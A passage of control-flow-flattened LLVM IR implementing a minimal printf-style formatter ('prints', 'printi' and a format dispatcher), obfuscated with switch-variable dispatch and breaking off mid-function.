  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 2017503730, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 -2084495064, i32 -295139141
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 -603891706, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -603891706, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.492, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 1939653098, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 -352014933, i32 2097630578
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 188448407, i32 1921976249
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 -1377996539, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 -1377996539, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 1939653098, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 -1150659585, i32 906041140
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 -488263869, i32 1142130729
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 2028037340, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 2028037340, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 1939653098, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -694832358, i32 1175819975
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 587646359, i32 -401542609
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 -360740945, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 -360740945, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 1939653098, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -1274682595, i32 -1409175708
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 -849741537, i32 -1841626457
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -465410104, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -465410104, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 1939653098, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 1004838438, i32 595247760
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -1367288197, i32 2078620203
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 1599489704, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 1599489704, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 1939653098, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1296449441, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 153022636, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -1296449441, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 1939653098, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -1376281975, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 484014427, i32 200147002
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 200147002, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 856104050, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 856104050, label %first
    i32 1038850350, label %16
    i32 518591535, label %18
    i32 434125825, label %23
    i32 -766462641, label %26
    i32 1192519970, label %29
    i32 -2031288892, label %34
    i32 773704888, label %35
    i32 1099993185, label %39
    i32 -1668371138, label %44
    i32 1265577010, label %45
    i32 -867650431, label %46
    i32 1881143064, label %51
    i32 -1965997110, label %52
    i32 296662819, label %56
    i32 -830848615, label %61
    i32 -475384339, label %64
    i32 1862118173, label %65
    i32 1066408820, label %66
    i32 1322111572, label %71
    i32 782269002, label %78
    i32 916355728, label %81
    i32 -1649843473, label %82
    i32 -389421086, label %86
    i32 -772733994, label %91
    i32 -969437780, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 1038850350, i32 -867650431
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 518591535, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 434125825, i32 1192519970
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -766462641, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 518591535, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -2031288892, i32 773704888
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 1099993185, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 1099993185, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -1668371138, i32 1265577010
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 1265577010, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -867650431, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 1862118173, i32 1881143064
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -1965997110, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 296662819, i32 -475384339
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -830848615, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 -1965997110, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 1862118173, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1066408820, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 1322111572, i32 916355728
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 782269002, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 1066408820, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1649843473, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 -389421086, i32 -969437780
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -772733994, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 -1649843473, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1695959927, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1695959927, label %first
    i32 2134122746, label %26
    i32 376630778, label %34
    i32 -1541430117, label %38
    i32 476078943, label %42
    i32 -1351442318, label %46
    i32 734192224, label %49
    i32 612985135, label %54
    i32 312795453, label %58
    i32 305127453, label %65
    i32 1990725227, label %71
    i32 1851497402, label %80
    i32 -241109979, label %84
    i32 -382160674, label %88
    i32 1639544950, label %93
    i32 1498891560, label %99
    i32 -344907266, label %102
    i32 579443153, label %103
    i32 1339692085, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 2134122746, i32 376630778
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 1339692085, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -1541430117, i32 734192224
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 476078943, i32 734192224
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -1351442318, i32 734192224
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 734192224, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
